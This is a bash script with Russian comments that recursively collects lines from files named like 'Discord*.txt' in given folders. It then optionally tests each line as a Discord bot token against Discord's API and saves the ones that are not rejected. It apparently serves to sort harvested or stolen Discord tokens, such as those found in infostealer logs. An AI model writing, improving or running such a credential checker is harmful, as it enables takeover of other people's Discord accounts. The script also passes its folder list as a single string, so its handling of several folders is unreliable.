#!/bin/bash

# Проверка аргументов
if [[ $# -lt 2 ]]; then
  echo "Использование: $0 <validate> <out_path> <folder1> ..."
  exit 1
fi

validate=$1
out_path=$2
shift 2
search_folders=$@

# Функция поиска токенов
function find_tokens() {

  for folder in "$@"; do
    for file in "$folder"/*; do
      if [[ "$file" =~ Discord.*\.txt$ ]]; then
        while read line; do
          echo "$line" >> "$tokens_file"
        done < "$file"
      elif [ -d "$file" ]; then
        find_tokens "$file"
      fi
    done
  done

}

# Функция проверки токенов
function validate_tokens() {

  while read token; do
    response=$(curl -s -H "Authorization: Bot $token" https://discord.com/api/v6/invite/random-code)

    if [[ "$response" =~ "401: Unauthorized" ]]; then
      echo "Токен $token невалиден"
    else
      echo "Токен $token валиден"
      echo "$token" >> "$valid_tokens_file"
    fi

  done < "$tokens_file"

}

# Логика

mkdir -p "$out_path"
tokens_file="$out_path/tokens.txt"
valid_tokens_file="$out_path/valid_tokens.txt"

find_tokens "$search_folders"

if [[ "$validate" == "1" ]]; then
  validate_tokens
fi

echo "Готово"
